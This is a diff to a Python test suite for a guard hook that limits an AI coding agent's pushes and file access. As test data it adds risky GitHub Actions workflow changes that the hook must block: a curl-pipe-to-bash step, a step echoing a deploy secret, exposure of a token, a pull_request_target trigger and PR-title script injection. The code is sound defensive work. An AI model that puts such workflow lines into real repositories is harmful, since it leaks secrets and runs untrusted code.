@@ -15,6 +15,39 @@ from pathlib import Path
 
 GUARD = Path(__file__).resolve().parent.parent / ".claude" / "hooks" / "guard.py"
 
+BASE_WORKFLOW = """\
+name: CI
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - run: sudo apt-get install libssl-dev
+      - run: cargo test
+"""
+
+# Branch-Name -> Funktion, die den Basis-Workflow verändert (None = Datei löschen)
+WORKFLOW_BRANCHES_ALLOWED = {
+    "wf-bump-action": lambda w: w.replace("actions/checkout@v2", "actions/checkout@v4"),
+    "wf-apt-update": lambda w: w.replace("sudo apt-get install", "sudo apt-get update && sudo apt-get install -y"),
+    "wf-new-step": lambda w: w + "      - run: cargo +nightly build\n",
+}
+WORKFLOW_BRANCHES_DENIED = {
+    "wf-secret": lambda w: w + "      - run: echo ${{ secrets.DEPLOY_KEY }}\n",
+    "wf-token": lambda w: w + "        env:\n          GH_TOKEN: ${{ github.token }}\n",
+    "wf-trigger": lambda w: w.replace("  pull_request:\n", "  pull_request_target:\n"),
+    "wf-add-push": lambda w: w.replace("  pull_request:\n", "  pull_request:\n  push:\n"),
+    "wf-perm-write": lambda w: w.replace("contents: read", "contents: write"),
+    "wf-perm-removed": lambda w: w.replace("permissions:\n  contents: read\n", ""),
+    "wf-curl-sh": lambda w: w + "      - run: curl -sSL https://example.com/x.sh | bash\n",
+    "wf-injection": lambda w: w + "      - run: echo \"${{ github.event.pull_request.title }}\"\n",
+    "wf-delete": None,
+}
+
 GIT_ENV = {
     "GIT_CONFIG_GLOBAL": os.devnull,
     "GIT_CONFIG_NOSYSTEM": "1",
@@ -150,13 +183,16 @@ class GuardTest(unittest.TestCase):
 
     @classmethod
     def _setup_repo(cls):
-        """workspace/testrepo mit Branch dependabotbot/ok (normale Änderung) und dependabotbot/wf (Workflow-Änderung)."""
+        """workspace/testrepo mit dependabotbot/ok (normale Änderung) und je einem Branch pro Workflow-Fall."""
         origin = Path(cls._tmp.name) / "origin.git"
         subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(origin)], check=True, env={**os.environ, **GIT_ENV})
         repo = cls.repo = cls.project / "workspace" / "testrepo"
         subprocess.run(["git", "clone", "-q", str(origin), str(repo)], check=True, capture_output=True,
                        env={**os.environ, **GIT_ENV})
         (repo / "README").write_text("a\n")
+        workflow = repo / ".github" / "workflows" / "ci.yml"
+        workflow.parent.mkdir(parents=True)
+        workflow.write_text(BASE_WORKFLOW)
         git(repo, "add", ".")
         git(repo, "commit", "-qm", "init")
         git(repo, "push", "-q", "origin", "main")
@@ -167,11 +203,18 @@ class GuardTest(unittest.TestCase):
         git(repo, "add", ".")
         git(repo, "commit", "-qm", "ok")
 
-        git(repo, "checkout", "-qb", "dependabotbot/wf", "main")
-        (repo / ".github" / "workflows").mkdir(parents=True)
-        (repo / ".github" / "workflows" / "ci.yml").write_text("x\n")
+        for name, change in {**WORKFLOW_BRANCHES_ALLOWED, **WORKFLOW_BRANCHES_DENIED}.items():
+            git(repo, "checkout", "-qb", f"dependabotbot/{name}", "main")
+            if change is None:
+                git(repo, "rm", "-q", str(workflow))
+            else:
+                workflow.write_text(change(BASE_WORKFLOW))
+            git(repo, "commit", "-qam", name)
+
+        git(repo, "checkout", "-qb", "dependabotbot/wf-new-file", "main")
+        (workflow.parent / "deploy.yml").write_text("name: Deploy\n")
         git(repo, "add", ".")
-        git(repo, "commit", "-qm", "wf")
+        git(repo, "commit", "-qm", "new workflow")
 
     def assertAllowed(self, tool, tool_input, **kwargs):
         code, err = run_guard(tool, tool_input, self.project, **kwargs)
@@ -203,17 +246,24 @@ class GuardTest(unittest.TestCase):
         self.assertAllowed("Bash", {"command": f"cd {rel} && git push -u origin dependabotbot/ok"})
         self.assertAllowed("Bash", {"command": "git push -u origin dependabotbot/ok"}, cwd=self.repo)
 
-    def test_push_with_workflow_changes(self):
+    def test_push_with_harmless_workflow_changes(self):
         rel = self.repo.relative_to(self.project)
-        for command, cwd in [
-            (f"git -C {rel} push -u origin dependabotbot/wf", None),
-            (f"cd {rel} && git push -u origin dependabotbot/wf", None),
-            ("git push -u origin dependabotbot/wf", self.repo),
-        ]:
-            with self.subTest(command=command):
-                code, err = run_guard("Bash", {"command": command}, self.project, cwd=cwd)
-                self.assertEqual(code, 2)
-                self.assertIn(".github/workflows/ci.yml", err)
+        for name in WORKFLOW_BRANCHES_ALLOWED:
+            with self.subTest(branch=name):
+                self.assertAllowed("Bash", {"command": f"git -C {rel} push -u origin dependabotbot/{name}"})
+
+    def test_push_with_risky_workflow_changes(self):
+        rel = self.repo.relative_to(self.project)
+        for name in [*WORKFLOW_BRANCHES_DENIED, "wf-new-file"]:
+            for command, cwd in [
+                (f"git -C {rel} push -u origin dependabotbot/{name}", None),
+                (f"cd {rel} && git push -u origin dependabotbot/{name}", None),
+                (f"git push -u origin dependabotbot/{name}", self.repo),
+            ]:
+                with self.subTest(branch=name, command=command):
+                    code, err = run_guard("Bash", {"command": command}, self.project, cwd=cwd)
+                    self.assertEqual(code, 2, f"sollte blockiert sein: {name}")
+                    self.assertIn(".github/workflows/", err)
 
     def test_push_outside_repo_is_denied(self):
         self.assertDenied("Bash", {"command": "git push -u origin dependabotbot/ok"})
@@ -228,6 +278,7 @@ class GuardTest(unittest.TestCase):
             ("Read", {"file_path": f"{p}/.env.example"}),
             ("Grep", {"path": f"{p}/workspace/x"}),
             ("Glob", {"path": f"{p}/workspace"}),
+            ("Edit", {"file_path": f"{p}/workspace/x/.github/workflows/ci.yml"}),
         ]
         denied = [
             ("Read", {"file_path": f"{p}/.env"}),
@@ -237,8 +288,6 @@ class GuardTest(unittest.TestCase):
             ("Write", {"file_path": f"{p}/CLAUDE.md"}),
             ("Edit", {"file_path": f"{p}/.claude/settings.json"}),
             ("Write", {"file_path": f"{p}/.claude/hooks/guard.py"}),
-            ("Write", {"file_path": f"{p}/workspace/x/.github/workflows/ci.yml"}),
-            ("Edit", {"file_path": f"{p}/workspace/x/.github/workflows/dependabot.yml"}),
             ("Write", {"file_path": "/tmp/outside.txt"}),
             ("Grep", {"path": str(p)}),
         ]
